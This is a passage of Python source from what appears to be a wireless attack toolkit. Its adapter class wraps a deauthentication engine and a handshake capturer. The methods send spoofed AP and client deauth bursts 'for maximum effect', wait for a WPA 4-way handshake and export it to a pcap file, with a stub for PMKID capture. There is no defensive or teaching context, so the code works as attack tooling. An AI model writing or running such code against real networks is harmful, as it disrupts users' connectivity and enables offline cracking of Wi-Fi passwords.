        self._capturing = False
        self._capture_bssid = None

    async def capture_pmkid(self, bssid, channel):
        """
        Attempt PMKID capture by sending association and sniffing EAPOL M1.

        Delegates to the AttackChain's PMKIDAttack scapy implementation
        since HandshakeCapture does not natively extract PMKID.
        Returns None to let the chain fall through to direct scapy path.
        """
        # Let the attack chain handle this with its own scapy implementation
        return None

    async def start_capture(self, bssid, channel):
        """Start handshake capture - resets state for target BSSID."""
        import asyncio
        self._capturing = True
        self._capture_bssid = bssid
        # Reset any existing frames for this BSSID
        if hasattr(self._handshakes, 'reset'):
            await asyncio.to_thread(self._handshakes.reset, bssid)

    async def send_deauth(self, bssid, client, count=10):
        """
        Send deauth burst via the DeauthEngine.

        Sends both AP-spoofed deauth (reason 7: class 3 frame from
        non-associated STA) and client-spoofed deauth for maximum effect.
        """
        import asyncio
        # Send deauth burst - wraps synchronous scapy sendp
        if hasattr(self._deauth, 'send_deauth_burst'):
            await asyncio.to_thread(
                self._deauth.send_deauth_burst, bssid, client, count=count
            )
        elif hasattr(self._deauth, 'deauth_client'):
            await asyncio.to_thread(
                self._deauth.deauth_client, bssid, client, count=count
            )
        else:
            # Fallback: add target and let engine handle it
            await asyncio.to_thread(
                self._deauth.add_target, bssid, {client}
            )

    async def wait_handshake(self, bssid, timeout=60.0, poll_interval=1.0):
        """
        Wait for a complete 4-way handshake for the target BSSID.

        Polls HandshakeCapture.has_handshake_for_bssid() (public API)
        every poll_interval seconds until timeout.
        """
        import asyncio
        elapsed = 0.0
        while elapsed < timeout and self._capturing:
            await asyncio.sleep(poll_interval)
            elapsed += poll_interval

            # Use the stable public API for handshake checking
            complete = self._handshakes.has_handshake_for_bssid(bssid, min_frames=2)

            if complete:
                # Export the capture via public API
                pcap_file = self._handshakes.export_pcap_for_bssid(bssid)

                return {
                    "handshake": True,
                    "file": pcap_file or f"captures/{bssid.replace(':', '')}.cap",
                    "frame_count": 4,
                }

        return None

    async def stop_capture(self):
        """Stop capture state."""
        self._capturing = False
        self._capture_bssid = None
